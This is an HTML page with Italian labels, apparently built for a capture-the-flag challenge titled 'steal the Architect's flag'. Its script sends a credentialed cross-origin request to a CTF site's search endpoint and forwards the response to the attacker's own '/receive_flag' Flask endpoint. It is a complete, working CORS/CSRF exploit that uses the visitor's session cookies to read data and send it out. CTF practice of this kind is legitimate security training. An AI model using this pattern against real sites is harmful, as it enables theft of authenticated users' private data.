<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <button id="stealFlag">Ruba Flag</button>

    <script>
        document.getElementById('stealFlag').onclick = () => {
            fetch('http://matrix-simplified.capturetheflags.site/search?s=flag', {
                method: 'GET',
                credentials: 'include',
                mode: 'cors'
            })
            .then(response => response.text())
            .then(data => {
                // Invia la flag al server Flask
                fetch('/receive_flag', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'flag=' + encodeURIComponent(data)  // Invia i dati ricevuti
                });
            })
            .catch(error => console.error('Errore:', error));
        };
    </script>
</body>
</html>
